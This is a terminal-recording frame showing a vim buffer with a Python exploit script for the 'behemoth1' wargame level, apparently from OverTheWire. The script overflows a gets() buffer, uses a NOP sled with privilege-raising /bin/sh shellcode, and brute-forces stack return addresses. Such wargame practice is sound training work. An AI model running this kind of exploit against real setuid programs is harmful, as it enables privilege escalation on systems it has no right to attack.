[36.46496, "o", "\u001b[1;1H\u001b[35mimport\u001b[m struct, subprocess, sys, os, time\r\r\nsc = \u001b[36mopen\u001b[m(\u001b[31m\"/tmp/b1.bin\"\u001b[m, \u001b[31m\"rb\"\u001b[m).read()\u001b[2;38H\u001b[K\u001b[3;1H\u001b[34m# behemoth1: gets(buf[67]) -> saved ret at offset 71. Stack RWE, no ASLR.\u001b[m\u001b[3;74H\u001b[K\u001b[4;1H\u001b[34m# Payload = 71 NOPs + ret address + shellcode, fed on stdin (gets reads it).\r\r\n# Shellcode: PWN! marker, setreuid+setuid(euid), execve /bin/sh.\u001b[m\r\r\n\u001b[33massert\u001b[m \u001b[36mlen\u001b[m(sc) <= \u001b[31m128\u001b[m \u001b[33mand\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m \u001b[33mnot\u001b[m \u001b[33min\u001b[m sc \u001b[33mand\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m \u001b[33mnot\u001b[m \u001b[33min\u001b[m sc\r\r\n\u001b[33mdef\u001b[m \u001b[36mpayload_for\u001b[m(addr):\r\r\n    \u001b[33mreturn\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * \u001b[31m71\u001b[m + struct.pack(\u001b[31m\"<I\"\u001b[m, addr) + sc + \u001b[31mb\"\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m\r\r\n\u001b[33mdef\u001b[m \u001b[36mprobe\u001b[m(addr):\r\r\n    \u001b[33mif\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m \u001b[33min\u001b[m struct.pack(\u001b[31m\"<I\"\u001b[m, addr):\u001b[11;9H\u001b[33mreturn\u001b[m \u001b[36mFalse\u001b[m\r\r\n    \u001b[33mtry\u001b[m:\u001b[13;9Hp = subprocess.Popen([\u001b[31mb\"/behemoth/behemoth1\"\u001b[m], stdin=subprocess.PIPE,\u001b[14;30Hstdout=subprocess.PIPE, stderr=subprocess.STDOUT, env={})\u001b[15;9Hout, _ = p.communicate(payload_for(addr), timeout=\u001b[31m2\u001b[m)\r\r\n    \u001b[33mexcept\u001b[m subprocess.TimeoutExpired:\u001b[17;9Hp.kill()\u001b[18;9H\u001b[33mtry\u001b[m: p.communicate()\u001b[19;9H\u001b[33mexcept\u001b[m \u001b[32mException\u001b[m: \u001b[33mpass\u001b[20;9Hreturn\u001b[m \u001b[36mFalse\u001b[m\r\r\n    \u001b[33mreturn\u001b[m \u001b[31mb\"PWN!\"\u001b[m \u001b[33min\u001b[m out\r\r\nfound = \u001b[36mNone\u001b[m\r\r\nt0 = time.time()\r\r\n\u001b[33mfor\u001b[m addr \u001b[33min\u001b[m \u001b[36mrange\u001b[m(\u001b[31m0xffffd000\u001b[m, \u001b[31m0xffffe800\u001b[m, \u001b[31m16\u001b[m):\r\r\n    \u001b[33mif\u001b[m probe(addr):\u001b[26;9Hfound = addr\u001b[27;9H\u001b[36mprint\u001b[m(\u001b[31m\"HIT at %#x after %d probes (%.1f s)\"\u001b[m % (addr, (addr - \u001b[31m0xffffd000\u001b[m) // \u001b[31m16\u001b[m + \u001b[31m1\u001b[m, time.timm\u001b[28;1He() - t0))\u001b[29;9H\u001b[33mbreak\r\r\nif\u001b[m found \u001b[33mis\u001b[m \u001b[36mNone\u001b[m:\r\r\n    \u001b[36mprint\u001b[m(\u001b[31m\"no address landed in the sled\"\u001b[m)\r\r\n    sys.exit(\u001b[31m1\u001b[m)\r\r\n\u001b[34m# final run: payload on stdin, commands after a delay; stdout = the pty so the\u001b[m\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
